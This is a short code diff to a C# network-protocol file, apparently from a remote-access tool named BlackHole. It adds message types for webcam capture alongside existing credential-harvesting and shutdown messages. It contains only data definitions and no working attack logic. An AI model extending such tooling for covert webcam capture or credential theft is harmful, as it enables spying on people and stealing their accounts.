@@ -165,6 +165,30 @@ namespace BlackHole.Common.Network.Protocol
         }
     }
 
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class StartWebcamCaptureMessage : NetMessage
+    {
+        public int ScreenNumber { get; set; }
+        public int Quality { get; set; }
+    }
+
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class StopWebcamCaptureMessage : NetMessage
+    {
+        //
+    }
+
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class WebcamCaptureMessage : NetMessage
+    {
+        public int ScreenNumber { get; set; }
+        public int Quality { get; set; }
+        public int Width { get; set; }
+        public int Height { get; set; }
+        public byte[] RawImage { get; set; }
+        public int FrameRate { get; set; }
+    }
+
     // ====================================
     // ================= Data =============
     // ====================================
@@ -202,6 +226,9 @@ namespace BlackHole.Common.Network.Protocol
         public string Size { get; set; }
     }
 
+    [ProtoInclude(1022, typeof(WebcamCaptureMessage))]
+    [ProtoInclude(1021, typeof(StopWebcamCaptureMessage))]
+    [ProtoInclude(1020, typeof(StartWebcamCaptureMessage))]
     [ProtoInclude(1019, typeof(CredentialsMessage))]
     [ProtoInclude(1018, typeof(StartCredentialsMessage))]
     [ProtoInclude(1017, typeof(ShutdownMessage))]
